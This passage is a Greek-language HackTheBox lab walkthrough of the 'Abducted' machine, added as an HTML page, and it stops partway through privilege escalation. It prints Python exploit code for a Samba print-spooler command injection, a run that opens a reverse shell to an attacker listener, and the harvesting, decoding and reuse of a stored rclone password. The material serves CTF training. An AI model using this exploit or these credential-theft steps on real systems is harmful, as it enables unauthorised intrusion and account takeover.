@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="el">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Abducted — S. Markakis</title>
+<meta name="description" content="Walkthrough του μηχανήματος HackTheBox Abducted — unauthenticated RCE μέσω injection %J στο print-spooler του Samba (CVE-2026-4480), ανάκτηση credentials από config rclone, SMB symlink key injection, και systemd drop-in μέχρι root.">
+<meta property="og:title" content="HTB: Abducted — S. Markakis">
+<meta property="og:description" content="Walkthrough του μηχανήματος HackTheBox Abducted — unauthenticated RCE μέσω injection %J στο print-spooler του Samba (CVE-2026-4480), ανάκτηση credentials από config rclone, SMB symlink key injection, και systemd drop-in μέχρι root.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-abducted-el.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-abducted.png">
+<meta property="og:locale" content="el_GR">
+<meta property="og:locale:alternate" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-abducted.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-abducted-el.html">
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-abducted.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-abducted-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-abducted.html">
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    /* terminal colors — muted to stay on-brand */
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* ── NAV ── */
+
+  /* ── WRAPPER ── */
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  /* ── POST HEADER ── */
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-smb  { background: #d8c8b8; color: #5a3a18; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  /* ── OVERVIEW BOX ── */
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  /* ── ATTACK CHAIN ── */
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  /* ── HEADINGS ── */
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p {
+    color: var(--text);
+    margin-bottom: 1rem;
+  }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  /* ── INLINE CODE ── */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  /* ── TERMINAL BLOCK ── */
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  /* prompt colors — muted to match cream palette */
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  /* ── ALERT BOXES ── */
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  /* ── TABLE ── */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  /* ── LISTS ── */
+  ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  /* ── SUMMARY TABLE special cols ── */
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  /* ── FOOTER ── */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  /* ── BACK LINK ── */
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Abducted",
+  "description": "Walkthrough του μηχανήματος HackTheBox Abducted — unauthenticated RCE μέσω injection %J στο print-spooler του Samba (CVE-2026-4480), ανάκτηση credentials από config rclone, SMB symlink key injection, και systemd drop-in μέχρι root.",
+  "datePublished": "2026-08-04",
+  "dateModified": "2026-08-04",
+  "inLanguage": "el",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-abducted-el.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-abducted.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-abducted"
+  },
+  "timeRequired": "PT7M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Πίσω στο blog</a>
+
+<div class="wrapper">
+
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Πίσω στα posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><a href="htb-abducted.html" style="font-weight:600;">English</a> &nbsp;·&nbsp; <strong style="color:var(--text-dark);">Ελληνικά</strong></p>
+
+  <!-- POST HEADER -->
+  <div class="post-header">
+    <h1>HTB: Abducted</h1>
+    <div class="post-meta">
+      <span class="date">4 Αυγούστου 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-smb">Samba</span>
+      <span class="tag">Linux</span>
+      <span class="tag">Μεσαιο</span>
+      <span>&nbsp;7 λεπτά αναγνωσης</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <!-- OVERVIEW -->
+  <div class="overview">
+    Το Abducted είναι ένα box μόνο-Samba — χωρίς web server, μόνο SSH και δύο θύρες SMB. Το μονοπάτι εισόδου είναι ένα unauthenticated <strong>shell injection στο print-spooler</strong> (CVE-2026-4480) ενάντια σε ένα share εκτυπωτή προσβάσιμο ως guest, που προσγειώνεται σαν <code>nobody</code>. Από εκεί είναι μια ευθεία γραμμή μέσα από ένα διαρρεύσαν credential <strong>rclone</strong>, επαναχρησιμοποίηση password στο SSH, ένα <strong>symlink SMB wide-links</strong> που εκμεταλλευόμαστε για να φυτέψουμε ένα κλειδί SSH σαν δεύτερος χρήστης, και ένα τελικό privesc μέσω ενός <strong>systemd drop-in</strong> εγγράψιμου από ομάδα για την υπηρεσία Samba.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">Guest SMB (HP-Reception)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">CVE-2026-4480 RCE</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">nobody</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">rclone.conf</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">scott (SSH)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">marcus (SMB symlink)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root (systemd)</span>
+  </div>
+
+  <img src="assets/htb-abducted/solved.png" alt="HackTheBox &quot;You have solved Abducted!&quot; congratulations screen — machine rank #1721, retired, 650 XP earned" style="display:block;max-width:280px;width:100%;height:auto;margin:0 auto 2.5rem;border-radius:8px;border:1px solid var(--border);">
+
+  <!-- ══ RECON ══ -->
+  <h2>Αναγνώριση</h2>
+
+  <h3>Nmap</h3>
+  <p>Στάνταρ scan υπηρεσιών ενάντια στο box:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">nmap -sC -sV -A &lt;TARGET_IP&gt; -oA abducted</span>
+
+<span class="po">PORT    STATE SERVICE       VERSION
+22/tcp  open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+139/tcp open  netbios-ssn   Samba smbd 4
+445/tcp open  netbios-ssn   Samba smbd 4</span></div>
+  </div>
+
+  <table>
+    <tr><th>Θυρα</th><th>Υπηρεσια</th><th>Σημειωσεις</th></tr>
+    <tr><td>22</td><td>SSH</td><td>OpenSSH 9.6p1 Ubuntu</td></tr>
+    <tr><td>139/445</td><td>SMB</td><td>Samba smbd 4 — όνομα NetBIOS <code>ABDUCTED</code>, server string "Hartley Group Document Services"</td></tr>
+  </table>
+
+  <p>Χωρίς web server σε αυτό — το SMB είναι ολόκληρη η επιφάνεια επίθεσης. Πρόσθεσε το hostname:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/etc/hosts</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">echo "&lt;TARGET_IP&gt;  abducted.htb" | sudo tee -a /etc/hosts</span></div>
+  </div>
+
+  <!-- ══ SMB ENUM ══ -->
+  <h2>Καταμέτρηση SMB &amp; RPC</h2>
+
+  <p>Λιστάρισμα shares με null session:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">smbclient -L</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">smbclient -L //&lt;TARGET_IP&gt; -N</span>
+
+<span class="po">Sharename       Type      Comment
+---------       ----      -------
+HP-Reception    Printer   Reception printer
+projects        Disk      Hartley Group Project Files
+transfer        Disk      Staff file transfer
+IPC$            IPC       IPC Service (Hartley Group Document Services)</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">smbclient //&lt;TARGET_IP&gt;/projects -N</span>
+<span class="pr">NT_STATUS_ACCESS_DENIED</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">smbclient //&lt;TARGET_IP&gt;/transfer -N</span>
+<span class="pr">NT_STATUS_ACCESS_DENIED</span></div>
+  </div>
+
+  <p>Και τα δύο disk shares απορρίπτουν πρόσβαση guest — το <code>HP-Reception</code> είναι το μόνο ανοιχτό, και είναι εκτυπωτής, όχι file share. Το <code>rpcclient</code> ενάντια στο null session τραβάει ένα username και επιβεβαιώνει τα paths των shares στον δίσκο:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">rpcclient</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">rpcclient -U "" -N &lt;TARGET_IP&gt;</span>
+
+<span class="pd">rpcclient $&gt; </span><span class="pc">enumdomusers</span>
+<span class="po">user:[</span><span class="py">scott</span><span class="po">] rid:[0x3e8]</span>
+
+<span class="pd">rpcclient $&gt; </span><span class="pc">netshareenum</span>
+<span class="po">netname: HP-Reception
+path:    C:\var\spool\samba
+netname: projects
+path:    C:\srv\projects
+netname: transfer
+path:    C:\srv\transfer</span></div>
+  </div>
+
+  <div class="alert alert-info">
+    Ένας τοπικός χρήστης (<strong>scott</strong>), ένα share εκτυπωτή εγγράψιμο από guest πάνω στο <code>/var/spool/samba</code>, και ένας print server εκτεθειμένος σε ανώνυμους χρήστες. Σε συνδυασμό με το όνομα του box και ένα πρόσφατο CVE του Samba, ο εκτυπωτής είναι ο τρόπος εισόδου.
+  </div>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Αρχικό Foothold — CVE-2026-4480 (Samba %J Print Injection)</h2>
+
+  <p>Το CVE-2026-4480 είναι ένα unauthenticated command injection στο print spooler του Samba. Όταν υποβάλλεται ένα print job, το Samba αντικαθιστά το όνομα job που δίνει ο client μέσα στην ρυθμισμένη <code>print command</code> μέσω του token <code>%J</code> — χωρίς να κάνει sanitize shell metacharacters. Το να ορίσεις το όνομα job σε <code>|sh</code> και να γράψεις ένα shell payload σαν σώμα του job κάνει εκείνο το payload να εκτελείται από όποιον λογαριασμό τρέχει τον print handler του <code>smbd</code>.</p>
+
+  <p>Το exploit μιλάει απευθείας στο named pipe <code>spoolss</code>: άνοιξε ένα handle στον εκτυπωτή, ξεκίνα ένα document με όνομα job <code>|sh</code>, και γράψε το payload σαν δεδομένα εκτύπωσης.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">cve-2026-4480.py — core exploit logic</span>
+    </div>
+    <div class="term-body"><span class="pco"># apt install python3-samba</span>
+<span class="pb">from</span> samba.dcerpc <span class="pb">import</span> spoolss
+<span class="pb">from</span> samba.param <span class="pb">import</span> LoadParm
+<span class="pb">from</span> samba.credentials <span class="pb">import</span> Credentials
+
+lp = LoadParm(); lp.load_default()
+creds = Credentials(); creds.guess(lp); creds.set_anonymous()
+
+iface = spoolss.spoolss(<span class="py">f'ncacn_np:{rhost}[\\pipe\\spoolss]'</span>, lp, creds)
+h = iface.OpenPrinter(<span class="py">f'\\\\{rhost}\\HP-Reception'</span>, <span class="py">''</span>, spoolss.DevmodeContainer(), 0x8)
+
+i1 = spoolss.DocumentInfo1()
+i1.document_name = <span class="py">'|sh'</span>          <span class="pco"># %J injection point</span>
+i1.datatype = <span class="py">'RAW'</span>
+ctr = spoolss.DocumentInfoCtr(); ctr.level = 1; ctr.info = i1
+
+iface.StartDocPrinter(h, ctr)
+iface.StartPagePrinter(h)
+iface.WritePrinter(h, payload, len(payload))   <span class="pco"># reverse shell one-liner</span>
+iface.EndPagePrinter(h); iface.EndDocPrinter(h); iface.ClosePrinter(h)</span></div>
+  </div>
+
+  <p>Listener έτοιμος, το exploit πυροδοτημένο στο share του εκτυπωτή:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">exploit run</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">nc -lvnp 4444</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">python3 cve-2026-4480.py -r &lt;TARGET_IP&gt; -l &lt;YOUR_IP&gt; -p 4444</span>
+<span class="po">[*] Connecting to spoolss pipe on &lt;TARGET_IP&gt; ...
+[*] Opening printer handle: \\&lt;TARGET_IP&gt;\HP-Reception
+[*] Submitting print job with job name '|sh' (%J injection) ...
+[+] Job submitted successfully — check your listener!</span>
+
+<span class="pg">connect to [&lt;YOUR_IP&gt;] from (UNKNOWN) [&lt;TARGET_IP&gt;] 41288
+(remote) nobody@abducted:/$ </span><span class="pc">id</span>
+<span class="pg">uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)</span></div>
+  </div>
+
+  <div class="alert alert-success">Shell ως <strong>nobody</strong> — ο guest λογαριασμός του Samba, τρέχει unauthenticated κατευθείαν από το print spooler.</div>
+
+  <!-- ══ POST-EXPLOIT ══ -->
+  <h2>Post-Exploitation — Credentials rclone</h2>
+
+  <p>Σάρωση για αρχεία config έξω από τα συνηθισμένα paths του συστήματος:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nobody — hunting for creds</span>
+    </div>
+    <div class="term-body"><span class="pg">(remote) nobody@abducted:/$ </span><span class="pc">find / -type f -name "*.conf" 2&gt;/dev/null | grep -Ev "^/usr/|^/etc/"</span>
+<span class="po">/opt/offsite-backup/rclone.conf</span>
+
+<span class="pg">(remote) nobody@abducted:/$ </span><span class="pc">cat /opt/offsite-backup/rclone.conf</span>
+<span class="po">[offsite]
+type = sftp
+host = backup.hartley-group.internal
+user = svc-backup
+</span><span class="py">pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw</span>
+<span class="po">shell_type = unix</span></div>
+  </div>
+
+  <p>Το <code>rclone</code> κάνει obfuscate τα αποθηκευμένα passwords αντί να τα κρυπτογραφεί — το <code>rclone reveal</code> το αντιστρέφει με μία κίνηση:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">rclone reveal</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw</span>
+<span class="py">iXzvcib3SrpZ</span></div>
+  </div>
+
+  <!-- ══ LATERAL 1 ══ -->
+  <h2>Πλάγια Κίνηση — SSH ως scott (Επαναχρησιμοποίηση Password)</h2>
+
+  <p>Υπάρχουν μόνο δύο τοπικοί χρήστες στο box (scott, marcus). Το ανακτημένο password του <code>svc-backup</code> δοκιμάζεται ενάντια στο login SSH του scott και πετυχαίνει:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ssh — scott</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">ssh scott@abducted.htb</span>
+<span class="po">Password: </span><span class="py">iXzvcib3SrpZ</span>
+
+<span class="pg">scott@abducted:~$ </span><span class="pc">id</span>
+<span class="pg">uid=1000(scott) gid=1001(scott) groups=1001(scott)</span>
+<span class="pg">scott@abducted:~$ </span><span class="pc">cat user.txt</span>
+<span class="py">HTB{REDACTED}</span></div>
+  </div>
+
+  <div class="alert alert-success">🚩 User flag πιάστηκε — το password rclone του svc-backup επαναχρησιμοποιήθηκε αυτούσιο για τον λογαριασμό SSH του scott.</div>
+
+  <!-- ══ ENUM AS SCOTT ══ -->
+  <h2>Καταμέτρηση ως scott</h2>
+
+  <p>Χωρίς δικαιώματα sudo. Το config Samba αξίζει μια δεύτερη ματιά τώρα που υπάρχει ένα πραγματικό shell για να το διαβάσει κανείς:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">smb.conf / shares.conf</span>
+    </div>
+    <div class="term-body"><span class="pg">scott@abducted:~$ </span><span class="pc">sudo -l</span>
+<span class="pr">Sorry, user scott may not run sudo on abducted.</span>
+
+<span class="pg">scott@abducted:~$ </span><span class="pc">cat /etc/samba/shares.conf</span>
+<span class="po">[HP-Reception]
+path = /var/spool/samba
+printable = yes
+guest ok = yes
+</span><span class="py">print command = /usr/local/bin/printaudit %J %s</span>
+<span class="po">
+[transfer]
+comment = Staff file transfer
+path = /srv/transfer
+valid users = scott
+</span><span class="py">force user = marcus</span>
+<span class="po">read only = no
+</span><span class="py">wide links = yes</span>
+<span class="po">browseable = yes</span></div>
+  </div>
+
+  <div class="alert alert-warn">
